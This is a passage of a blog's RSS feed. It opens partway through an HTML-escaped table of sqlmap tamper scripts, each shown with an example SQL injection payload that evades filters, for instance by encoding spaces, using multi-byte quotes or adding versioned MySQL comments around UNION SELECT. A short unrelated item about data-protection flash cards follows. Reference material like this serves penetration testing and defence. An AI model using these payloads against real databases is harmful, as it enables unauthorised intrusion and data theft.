&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a pound character (&amp;rsquo;#&amp;lsquo;) followed by a random string and a new line (&amp;rsquo;\n&amp;rsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2morehash.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a pound character (&amp;rsquo;#&amp;lsquo;) followed by a random string and a new line (&amp;rsquo;\n&amp;rsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2mssqlblank.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a random blank character from a valid set of alternate characters&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT%0Eid%0DFROM%07users&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2mssqlhash.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a pound character (&amp;rsquo;#&amp;lsquo;) followed by a new line (&amp;rsquo;\n&amp;rsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1%23%0AAND%23%0A9227=9227&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2mysqlblank.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a random blank character from a valid set of alternate characters&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT%A0id%0BFROM%0Cusers&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2mysqldash.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a dash comment (&amp;rsquo;&amp;ndash;&amp;lsquo;) followed by a new line (&amp;rsquo;\n&amp;rsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1&amp;ndash;%0AAND&amp;ndash;%0A9227=9227&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2plus.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with plus (&amp;rsquo;+&amp;lsquo;)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT+id+FROM+users&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;space2randomblank.py&lt;/td&gt;
&lt;td&gt;Replaces space character (&amp;rsquo; &amp;lsquo;) with a random blank character from a valid set of alternate characters&lt;/td&gt;
&lt;td&gt;&amp;lsquo;SELECT%0Did%0DFROM%0Ausers&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;unionalltounion.py&lt;/td&gt;
&lt;td&gt;Replaces UNION ALL SELECT with UNION SELECT&lt;/td&gt;
&lt;td&gt;&amp;rsquo;-1 UNION SELECT&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;unmagicquotes.py&lt;/td&gt;
&lt;td&gt;Replaces quote character (&amp;lsquo;) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1%bf%27 AND 1=1&amp;ndash; &amp;lsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;versionedkeywords.py&lt;/td&gt;
&lt;td&gt;Encloses each non-function keyword with versioned MySQL comment&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1/&lt;em&gt;!UNION&lt;/em&gt;//&lt;em&gt;!ALL&lt;/em&gt;//&lt;em&gt;!SELECT&lt;/em&gt;//&lt;em&gt;!NULL&lt;/em&gt;/,/&lt;em&gt;!NULL&lt;/em&gt;/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/&lt;em&gt;!AS&lt;/em&gt;//&lt;em&gt;!CHAR&lt;/em&gt;/),CHAR(32)),CHAR(58,100,114,117,58))#&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;versionedmorekeywords.py&lt;/td&gt;
&lt;td&gt;Encloses each keyword with versioned MySQL comment&lt;/td&gt;
&lt;td&gt;&amp;lsquo;1/&lt;em&gt;!UNION&lt;/em&gt;//&lt;em&gt;!ALL&lt;/em&gt;//&lt;em&gt;!SELECT&lt;/em&gt;//&lt;em&gt;!NULL&lt;/em&gt;/,/&lt;em&gt;!NULL&lt;/em&gt;/,/&lt;em&gt;!CONCAT&lt;/em&gt;/(/&lt;em&gt;!CHAR&lt;/em&gt;/(58,122,114,115,58),/&lt;em&gt;!IFNULL&lt;/em&gt;/(CAST(/&lt;em&gt;!CURRENT_USER&lt;/em&gt;/()/&lt;em&gt;!AS&lt;/em&gt;//&lt;em&gt;!CHAR&lt;/em&gt;/),/&lt;em&gt;!CHAR&lt;/em&gt;/(32)),/&lt;em&gt;!CHAR&lt;/em&gt;/(58,115,114,121,58))#&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</description>
    </item>
    
    <item>
      <title>Data Protection Flash Cards</title>
      <link>http://www.forkbombers.com/2015/05/sqlmap-tool.html</link>
      <pubDate>Thu, 07 May 2015 00:00:00 +0000</pubDate>
      
      <guid>http://www.forkbombers.com/2015/05/sqlmap-tool.html</guid>
      <description>&lt;p&gt;Over at Designing for Privacy they&amp;rsquo;ve come up with a fantastic new way of raising data protection issues in the design process.&lt;/p&gt;

&lt;p&gt;They&amp;rsquo;ve come up with a set of flash cards which are split into four categories (constraints / regulation / system / users) which can be used to conceptualize the legal, moral and ethical responsibilities of parties during the design process.&lt;/p&gt;

&lt;p&gt;To take a look head on over to &lt;a href=&#34;http://www.designingforprivacy.co.uk&#34;&gt;www.designingforprivacy.co.uk&lt;/a&gt; where you can also find the downloadable versions to print.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>